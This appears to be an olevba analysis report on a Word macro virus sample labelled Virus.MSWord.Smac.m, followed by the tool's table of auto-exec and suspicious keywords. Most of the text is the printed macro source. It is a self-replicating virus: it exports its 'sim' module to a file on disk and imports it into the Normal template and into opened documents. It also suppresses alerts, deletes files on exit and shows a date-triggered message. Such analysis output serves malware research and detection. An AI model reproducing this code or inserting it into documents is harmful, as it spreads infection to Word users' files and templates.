olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smac.m-37dcc0ac12e4a2cfece6c60650614cf78d09b72c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smac.m-37dcc0ac12e4a2cfece6c60650614cf78d09b72c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sim.bas 
in file: Virus.MSWord.Smac.m-37dcc0ac12e4a2cfece6c60650614cf78d09b72c - OLE stream: 'Macros/VBA/sim'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "sim" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "sim" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("sim").Export ("c:\sim.txt")

If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\sim.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\sim.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If

Label_Exit:
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
If Day(Now) = 2 And Month(Now) = 9 Then MsgBox "Emmie was here!", vbCritical
Application.DisplayAlerts = wdAlertsNone
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "sim" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "sim" Then ActiveInstall = True
Next i
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\sim.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\sim.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
End Sub

Public Sub AutoExec()
On Error Resume Next
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = True
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\sim.txt")
Kill ("c:\dumplog.txt")
If Day(Now) = 13 Then MsgBox "Emmie was here!", vbCritical
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

